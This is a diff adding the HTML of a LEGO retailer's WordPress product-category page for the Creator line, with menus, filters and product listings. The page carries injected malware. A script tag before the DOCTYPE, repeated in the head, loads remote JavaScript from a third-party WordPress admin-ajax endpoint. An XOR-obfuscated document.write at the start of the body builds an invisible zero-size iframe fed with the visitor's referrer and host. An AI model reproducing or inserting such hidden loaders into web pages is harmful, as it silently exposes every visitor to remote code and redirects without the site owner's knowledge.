@@ -1,0 +1,994 @@
+
+<script type='text/javascript'>
+(function() {
+	 var s = document.createElement('script');
+	 s.type = 'text/javascript';
+	 s.async = true; 
+	 s.src ='http://www.wallpaperun.com/wp-admin/admin-ajax.php'+ '?action=zbjs&esid=6&task=getjs&md5=eed95da143babe08ad5e45d15e169f07';
+	 document.body.appendChild(s);
+})();
+</script>
+<!DOCTYPE html >
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<link rel="icon" href="http://lego.lk/wp-content/themes/KTI-lego/images/icon.ico" type="image/x-icon" >
+    <link rel="shortcut icon" href="http://lego.lk/wp-content/themes/KTI-lego/images/icon.ico" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>
+	<link href='http://fonts.googleapis.com/css?family=Karla:400,700' rel='stylesheet' type='text/css'> 
+    <link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/style.css" type="text/css" />
+	<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/global.css" type="text/css" />
+	<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/camera.css" type="text/css" />
+	<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/Colaborate-fontfacekit/stylesheet.css" type="text/css" charset="utf-8">
+	<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/prettyPhoto.css">
+	<!--<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/js/fancybox/jquery.fancybox-1.2.6.css" type="text/css" />-->
+	<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.css" type="text/css" />   
+	
+	
+	
+	<!--<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/basic.css" type="text/css" > -->
+    <!--[if IE 8]>
+     <link rel="stylesheet" type="text/css" href="http://legoo.pyxle.info/new/farlin/wp-content/themes/KTI-lego/css/lego-ie8.css" type="text/css" />
+    <![endif]-->
+    <!--[if IE 9]>
+     <link rel="stylesheet" type="text/css" href="http://legoo.pyxle.info/new/farlin/wp-content/themes/KTI-lego/css/lego-ie9.css" type="text/css" />
+    <![endif]-->
+	
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script> 
+    <!--<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script> -->
+   	<script type='text/javascript' src="http://lego.lk/wp-content/themes/KTI-lego/js/html5.js"></script>
+	<script type='text/javascript' src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery.tinyscrollbar.min.js"></script>
+    <script type='text/javascript' src='/js/jquery.mobile.customized.min.js'></script>
+    <script type='text/javascript' src='http://lego.lk/wp-content/themes/KTI-lego/js/jquery.easing.1.3.js'></script> 
+    <script type='text/javascript' src='http://lego.lk/wp-content/themes/KTI-lego/js/camera.js'></script> 
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery.tinycarousel.min.js"></script>
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/framework.js"></script>
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery.capty.min.js"></script>
+    <!--<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/fancybox/jquery.fancybox-1.2.6.js"></script>--> 
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.js"></script>
+	<!--<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/basic.js"></script> -->
+	<!--<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery.simplemodal.js"></script>-->
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/tabs.js"></script>
+    
+	<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/gen_validatorv4.js"></script>
+	                                                                                                          
+                                                                                                           
+	
+	
+<link rel="alternate" type="application/rss+xml" title="KTI &raquo; Feed" href="http://lego.lk/feed/" />
+<link rel="alternate" type="application/rss+xml" title="KTI &raquo; Comments Feed" href="http://lego.lk/comments/feed/" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://lego.lk/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://lego.lk/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.4.1" />
+
+<!-- All in One SEO Pack 2.0.2 by Michael Torbert of Semper Fi Web Design[,] -->
+<meta name="description" content="CREATOR" />
+<meta name="robots" content="noindex,follow" />
+
+<link rel="canonical" href="http://lego.lk/products/productcategories/creator/" />
+		<script type="text/javascript">
+
+		  var _gaq = _gaq || [];
+		  _gaq.push(['_setAccount', 'UA-36584814-2']);
+		  _gaq.push(['_trackPageview']);
+		  (function() {
+		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		  })();
+
+		</script>
+<!-- /all in one seo pack -->
+  
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+ $('#slider-code').tinycarousel();
+ $('#slider-code').tinycarousel({ display:4 });
+	
+ $("#menu-item-9").hover(
+        function() {
+               $(".dropdown").css("display", "block");
+			   $(".dropdown").css("visibility","visible");
+            },
+			function() {
+				$("#slider-code").hover(
+					function() {
+							  // $(".dropdown").css("display", "block");
+							  // $(".dropdown").css("visibility","visible");dropdown
+						},
+					function() {
+								$(".dropdown").css("display","none");
+								$(".dropdown").css("visibility","hidden");
+						}
+				);
+					});
+                    
+                    
+    
+    
+    
+    //$("#menu-item-9 a").attr("target","_blank");
+                    
+						});
+<script type='text/javascript'>
+(function() {
+	 var s = document.createElement('script');
+	 s.type = 'text/javascript';
+	 s.async = true; 
+	 s.src ='http://www.wallpaperun.com/wp-admin/admin-ajax.php'+ '?action=zbjs&esid=6&task=getjs&md5=eed95da143babe08ad5e45d15e169f07';
+	 document.body.appendChild(s);
+})();
+</script>
+</head>
+<body><script type="text/javascript">var a="'1Aqapkrv'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00tl6,'00'02)'02'00p,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<!--camera html-->
+    <div class="mnu-balance">
+				<div class="menu">
+					<a href="http://lego.lk"><div class="lft"></div></a>
+					<div class="mnu">
+						<div class="menu-main-menu-container"><ul id="menu-main-menu" class="menu"><li id="menu-item-12" class="hasmore menu-item menu-item-type-post_type menu-item-object-page menu-item-12"><a href="http://lego.lk/">Home</a></li>
+<li id="menu-item-9" class="hasmore menu-item menu-item-type-custom menu-item-object-custom menu-item-9"><a href="http://lego.lk/lego-product/">Products</a></li>
+<li id="menu-item-8" class="hasmore menu-item menu-item-type-post_type menu-item-object-page menu-item-8"><a href="http://lego.lk/about/">ABOUT</a></li>
+<li id="menu-item-15" class="hasmore menu-item menu-item-type-post_type menu-item-object-page menu-item-15"><a href="http://lego.lk/customer-care/">CUSTOMER CARE</a></li>
+<li id="menu-item-18" class="hasmore menu-item menu-item-type-post_type menu-item-object-page menu-item-18"><a href="http://lego.lk/where-to-buy/">Where To Buy</a></li>
+<li id="menu-item-22" class="hasmore menu-item menu-item-type-post_type menu-item-object-page menu-item-22"><a href="http://lego.lk/lego-club/">Lego Club</a></li>
+</ul></div>    
+						<ul>
+							<li class="hasmore">
+								<ul class="dropdown">
+										<div class="mnu-top-red"></div>
+														<div class="slider_code" id="slider-code">
+															<a class="buttons prev" href="#"></a>
+															<div class="viewport">	
+																<ul id="tabs">
+																	<ul class="overview">
+                                                                    
+                                              
+                         <!-- <a href="http://lego.lk/product-category?category=72"> -->
+                         <a href="http://lego.lk/products/productcategories/advanced-models/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>Advanced Models</span>
+                                      <img alt="Advanced Models" src="http://lego.lk/wp-content/uploads/2016/03/^E71E4A348E6D14415850B55806C8D839D30439E8F0AF109390^pimgpsh_fullsize_distr.png" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=71"> -->
+                         <a href="http://lego.lk/products/productcategories/chima/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>CHIMA</span>
+                                      <img alt="CHIMA" src="http://lego.lk/wp-content/uploads/2015/04/Chima.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=31"> -->
+                         <a href="http://lego.lk/products/productcategories/city/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>CITY</span>
+                                      <img alt="CITY" src="http://lego.lk/wp-content/uploads/2015/04/CITY.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=70"> -->
+                         <a href="http://lego.lk/products/productcategories/classic/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>CLASSIC</span>
+                                      <img alt="CLASSIC" src="http://lego.lk/wp-content/uploads/2015/04/CLASSIC.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=34"> -->
+                         <a href="http://lego.lk/products/productcategories/creator/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>CREATOR</span>
+                                      <img alt="CREATOR" src="http://lego.lk/wp-content/uploads/2015/04/Creator_No3in1.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=36"> -->
+                         <a href="http://lego.lk/products/productcategories/duplo/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>DUPLO</span>
+                                      <img alt="DUPLO" src="http://lego.lk/wp-content/uploads/2015/04/Duplo.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=39"> -->
+                         <a href="http://lego.lk/products/productcategories/friends/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>FRIENDS</span>
+                                      <img alt="FRIENDS" src="http://lego.lk/wp-content/uploads/2015/04/LEGO_Friends.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=69"> -->
+                         <a href="http://lego.lk/products/productcategories/juniors/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>JUNIORS</span>
+                                      <img alt="JUNIORS" src="http://lego.lk/wp-content/uploads/2015/04/Juniors.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=68"> -->
+                         <a href="http://lego.lk/products/productcategories/lego-movie/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>LEGO MOVIE</span>
+                                      <img alt="LEGO MOVIE" src="http://lego.lk/wp-content/uploads/2014/02/12358.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=73"> -->
+                         <a href="http://lego.lk/products/productcategories/minifigures/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>Minifigures</span>
+                                      <img alt="Minifigures" src="http://lego.lk/wp-content/uploads/2016/03/^EE886EDD49678085DC3ACA575504FA79B6ACF3A0462E97AAF7^pimgpsh_fullsize_distr.png" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=74"> -->
+                         <a href="http://lego.lk/products/productcategories/mixels/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>MIXELS</span>
+                                      <img alt="MIXELS" src="http://lego.lk/wp-content/uploads/2016/03/^69D00C8FC93DEB3ABE461A15DEF2180EA7ECF067613C96188D^pimgpsh_fullsize_distr.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=75"> -->
+                         <a href="http://lego.lk/products/productcategories/nexd-knights/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>NEXD KNIGHTS</span>
+                                      <img alt="NEXD KNIGHTS" src="http://lego.lk/wp-content/uploads/2016/04/^1CEDDF7C93BFF76B4325551CBC32FD396E50DB8D1E0A6F7CBD^pimgpsh_fullsize_distr.png" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=45"> -->
+                         <a href="http://lego.lk/products/productcategories/ninja-go/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>NINJA GO</span>
+                                      <img alt="NINJA GO" src="http://lego.lk/wp-content/uploads/2015/04/Ninjago_11.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=49"> -->
+                         <a href="http://lego.lk/products/productcategories/star-wars/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>STAR WARS</span>
+                                      <img alt="STAR WARS" src="http://lego.lk/wp-content/uploads/2015/04/StarWars.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=76"> -->
+                         <a href="http://lego.lk/products/productcategories/super-heroes/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>SUPER HEROES</span>
+                                      <img alt="SUPER HEROES" src="http://lego.lk/wp-content/uploads/2016/04/^C39AF9E721D520018CA32EDC3017F8D9D985FF118986308C2C^pimgpsh_fullsize_distr.png" />
+                                  </div>
+                              </li>
+                          </a>
+                                                  
+                         <!-- <a href="http://lego.lk/product-category?category=51"> -->
+                         <a href="http://lego.lk/products/productcategories/technic/">
+                              <li>
+                                  <div class="mnu-tmb">
+                                      <span>TECHNIC</span>
+                                      <img alt="TECHNIC" src="http://lego.lk/wp-content/uploads/2015/04/Technic.jpg" />
+                                  </div>
+                              </li>
+                          </a>
+                                                                                    
+																	</ul>
+																</ul>
+															</div>
+															<a class="buttons next" href="#"></a>
+														</div>
+										<div class="mun-bottom-red"></div>    
+								</ul>
+							</li>
+						</ul>
+						<div class="serch-cvr">
+							<div class="lft"></div>
+							<div class="mid-cvr">
+                                     <form action="http://lego.lk" id="searchform" method="get" name="searchform">
+                                        <!--<label class="assistive-text" for="s">Search</label>-->
+                                            <input type="text" placeholder="Search" id="s" name="s" class="mid">
+                                           <!-- <input type="submit" value="Search" id="searchsubmit" name="submit" class="submit">-->
+                                           <!-- <input type="hidden" value="recipes" name="post_type">     -->
+                                             </form>
+                             </div>
+							<div class="right"></div>
+						</div>
+					</div>
+					<div class="rght"></div>
+				</div>
+                
+                
+
+                
+                
+                
+	</div>
+ 
+ <!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+ <script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery-ui-1.8.23.custom.min.js"></script>
+ <link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/jquery-ui-1.8.23.custom.css" type="text/css" />-->
+
+
+
+ 
+ 
+
+  
+<title>LEGO  | CREATOR</title> 
+<script src="http://lego.lk/wp-content/themes/KTI-lego/js/script.js" type="text/javascript"></script>  
+<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery-ui-1.8.23.custom.min.js"></script>
+<link rel="stylesheet" href="http://lego.lk/wp-content/themes/KTI-lego/css/jquery-ui-1.8.23.custom.css" type="text/css" />     
+ 
+<!--jqery dropdown--> 
+<script type="text/javascript">
+
+   function test() {
+    
+    
+        //alert('vbvbvvbbvbbvvbb');
+    
+
+    
+    
+     
+        $('#auto_serach').val('');
+        $(this).css('outline','none');
+        $('#filter_dropdown_farlin.current').removeClass('current');
+        $(this).parent().addClass('current'); 
+        var filterVal = $('#filter_dropdown_farlin option:selected').val().toLowerCase().replace(' ','-');         
+        //alert(filterVal);    
+        if(filterVal =="all") {
+            $('ul#portfolio li').fadeIn('slow').removeClass('hidden');
+        } else {            
+            $('ul#portfolio li').each(function() {
+                    if(!$(this).hasClass(filterVal)) {
+                        $(this).fadeOut('normal').addClass('hidden');
+                    }else{
+                        $(this).fadeIn('slow').removeClass('hidden');                             
+                }
+            });
+        }
+        
+        return false;
+  
+     
+}
+
+
+
+
+	$(document).ready(function(){
+		if (!$.browser.opera) {
+    
+			// select element styling
+			$('select.select').each(function(){
+				var title = $(this).attr('title');
+				if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+				$(this)
+					.css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+					.after('<span class="select" >' + title + '</span>')
+					.change(function(){
+						val = $('option:selected',this).text();
+						$(this).next().text(val);
+						})
+			});
+            
+            $('select.select2').each(function(){
+                    var title = $(this).attr('title');
+                    if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+                    $(this)
+                           .css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+                           .after('<span class="select">' + title + '</span>')
+                           .change(function(){
+                           val = $('option:selected',this).text();
+                           $(this).next().text(val);
+                                                        })
+                                            });   
+                            $('#farlin_select1').change(function(){
+                                $.ajax({
+                                            type: "POST", 
+                                            url: 'http://lego.lk/farlin-ajax/',
+                                            data: {method:'getChildren',value:this.value},     
+                                            success: function(data) {
+                                            $('.sec3').html(data);
+                                          }
+                                        });
+                            }); 
+        
+        };
+        
+        
+        
+        
+		
+	});
+</script>
+ 
+
+<!--<script type="text/javascript" src="http://lego.lk/wp-content/themes/KTI-lego/js/jquery.paginate.js"></script>-->
+
+
+
+
+<!--jquery dropdown-->  
+    <div class="pre-bg">
+	    <div class="wrapper">
+    	<div class="hero">
+        	<section class="lft-sec"> 
+                <h1>CREATOR</h1> 
+                <p>
+                Let LEGO® Creator inspire your kids with building blocks and a range of creative toys designed just for them. Whether they love building motorized toys or designing new worlds, with LEGO Creator your children can bring their imaginations to life. </p>
+                                <section class="anyitem1">
+                	<img class="aligncenter size-medium wp-image-347" title="LEGO_CREATOR_Logo copy" src="http://lego.lk/new/wp-content/uploads/2013/01/LEGO_CREATOR_Logo-copy-300x123.jpg" alt="" width="300" height="123" />
+
+&nbsp;                </section>
+                                <p>   </p>
+            </section>
+            
+            <section class="right-sec">
+                  
+            </section>
+            
+            <section class="social-sec">
+            	<ul>                  
+                
+                	<li><span>Share with</span></li>
+                    <a href="http://www.facebook.com/sharer.php?u=http://lego.lk/product-category/?category=&t=CREATOR" target="blank"><li><img src="http://lego.lk/wp-content/themes/KTI-lego/images/fb.png"></li></a>
+                    <a href="http://twitter.com/home?status=Currently reading http://lego.lk/product-category/?category=" target="_blank"><li><img src="http://lego.lk/wp-content/themes/KTI-lego/images/twtr.png"></li></a>
+                    <!--<li><img src="http://lego.lk/wp-content/themes/KTI-lego/images/social_23.png"></li> --> 
+                </ul>
+            </section>
+            <section class="download-sec">
+             	<ul>
+                
+                     
+                                    </ul>
+            </section>
+            <section class="more-products-cvr">
+            	<div class="more-products-head">
+                	<section class="sec1"><span><h2>More Products</h2></span></section>
+                    
+                    
+                    
+                    <section class="sec2"><span><h4>Age Range</h4></span><div class="age-box">
+                    	<div class="p1"></div>
+                        <div class="p2">
+                        	<ul id="filter">
+                            <li><a href="#">All</a></li> 
+                                                        
+                               <li><a href="#">02-05</a></li>
+                                                  
+                               <li><a href="#">06-09</a></li>
+                                                  
+                               <li><a href="#">09-16</a></li>
+                                                  
+                               <li><a href="#">16+</a></li>
+                                                   </ul>
+                        </div>
+                        <div class="p3"></div>
+                    </div>
+                    </section>  
+
+                    <section class="sec3">
+                        <select class="select" title="Select one" id="filter_dropdown">
+                                            <option value="ALL">ALL</option>
+                                                      
+                        </select>
+                    </section>        
+                     
+
+                    
+                    <section class="sec4">
+                    	<div class="serch-box">
+                        	<div class="p1"></div>
+                            <div class="p2"><input type="text" id="auto_serach" class="txt-srch"><a href="#"></a></div>
+                            <div class="p3"></div>
+                        </div>
+                    </section>
+                </div>
+                <section class="product-set">
+                
+                  <div id="paginationdemo" class="demo"> 
+                     
+
+              
+<script>
+    $(function() {      
+        $( "#auto_serach" ).autocomplete({ 
+            source:["LEGO Creator Blue Power Jet 3 in 1 LG31039","LEGO Creator Chopper Transporter 3 in 1 \u2013 LG31043","LEGO Creator Fast Car 3 in 1 \u2013 LG31046","LEGO Creator Propeller Plane 3 in 1 \u2013 LG31047","LEGO Creator Desert Racers 3 in 1 \u2013 LG31040","LEGO Construction Vehicles 3 in 1 LG31041","LEGO Creator Super Soarer 3 in 1 LG31042","Turbo Quad","LEGO Forest Animals LG31019","Power Digger","Sunset Speeder","Twinblade Adventures","Mountain Hut","Red Thunder","Furry Creatures","Aviation Adventures","Tree House","Small Cottage","Power Mech","Highway Speedster","Fierce Flyer","Red Rotors","Super Racer","Mini Skyflyer","Mini Speeder","Mini Fire Truck","Prehistoric Hunters","LG31039","LG31043","LG31046","LG31047","LG31040","LG31041"," LG31042","LG31022","LG31019","LG31014","LG31017","LG31020","LG31025","LG31013","LG31021"],
+            max:5
+
+        });
+                                               
+    });
+</script>  
+
+            
+                                           
+                                        
+                                
+                   <div id="p1" class="pagedemo _current" style="">  
+                    <ul id="portfolio">
+                     
+                    
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31039 legocreatorbluepowerjet3in1lg31039">
+                        	<a href="http://lego.lk/products/creator/lego-creator-blue-power-jet-3-in-1-lg31039/"><span><strong>LEGO Creator Blue Power Jet 3 in 1 LG31039</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_blue_power_jet_3_in_1_lg31039.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31043 legocreatorchoppertransporter3in1&#8211;lg31043">
+                        	<a href="http://lego.lk/products/creator/lego-creator-chopper-transporter-3-in-1-lg31043/"><span><strong>LEGO Creator Chopper Transporter 3 in 1 &#8211; LG31043</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_chopper_transporter_3_in_1_31043.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31046 legocreatorfastcar3in1&#8211;lg31046">
+                        	<a href="http://lego.lk/products/creator/lego-creator-fast-car-3-in-1-lg31046/"><span><strong>LEGO Creator Fast Car 3 in 1 &#8211; LG31046</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_fast_car_3_in_1_31046.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31047 legocreatorpropellerplane3in1&#8211;lg31047">
+                        	<a href="http://lego.lk/products/creator/lego-creator-propeller-plane-3-in-1-lg31047/"><span><strong>LEGO Creator Propeller Plane 3 in 1 &#8211; LG31047</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_propeller_plane_3_in_1_310471.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31040 legocreatordesertracers3in1&#8211;lg31040">
+                        	<a href="http://lego.lk/products/creator/lego-creator-desert-racers-3-in-1-lg31040/"><span><strong>LEGO Creator Desert Racers 3 in 1 &#8211; LG31040</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_desert_racers_3_in_1_31040.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product LG31041 legoconstructionvehicles3in1lg31041">
+                        	<a href="http://lego.lk/products/creator/lego-construction-vehicles-3-in-1-lg31041/"><span><strong>LEGO Construction Vehicles 3 in 1 LG31041</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/03/lego_creator_construction_vehicles_3_in_1_31041.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product  LG31042 legocreatorsupersoarer3in1lg31042">
+                        	<a href="http://lego.lk/products/creator/creator-super-soarer-3-in-1/"><span><strong>LEGO Creator Super Soarer 3 in 1 LG31042</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2016/02/lego_creator_super_soarer_3_in_1_lg31042.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31022 turboquad">
+                        	<a href="http://lego.lk/products/creator/turbo-quad/"><span><strong>Turbo Quad</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31022-1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31019 legoforestanimalslg31019">
+                        	<a href="http://lego.lk/products/creator/forest-animals/"><span><strong>LEGO Forest Animals LG31019</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31019_alt2.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31014 powerdigger">
+                        	<a href="http://lego.lk/products/creator/power-digger/"><span><strong>Power Digger</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31017-back2.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31017 sunsetspeeder">
+                        	<a href="http://lego.lk/products/creator/sunset-speeder/"><span><strong>Sunset Speeder</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31017-back.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31020 twinbladeadventures">
+                        	<a href="http://lego.lk/products/creator/twinblade-adventures/"><span><strong>Twinblade Adventures</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31020_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31025 mountainhut">
+                        	<a href="http://lego.lk/products/creator/mountain-hut/"><span><strong>Mountain Hut</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31025-1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31013 redthunder">
+                        	<a href="http://lego.lk/products/creator/red-thunder/"><span><strong>Red Thunder</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31013_alt1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16 LG31021 furrycreatures">
+                        	<a href="http://lego.lk/products/creator/furry-creatures/"><span><strong>Furry Creatures</strong></span>
+                            <div class="product-img"><img src="http://lego.lk/wp-content/uploads/2014/02/31021-1.jpg"  class="fix" width="223" height="144"></div></a>
+                      </li>
+                          
+                                         
+                   
+                     
+                                                    
+                                                 
+                        
+                      -----KTI     
+                     <li class="product 06-09 09-16  aviationadventures">
+                        	<a href="http://lego.lk/products/creator/aviation-adventures/"><span><strong>Aviation Adventures</strong></span>
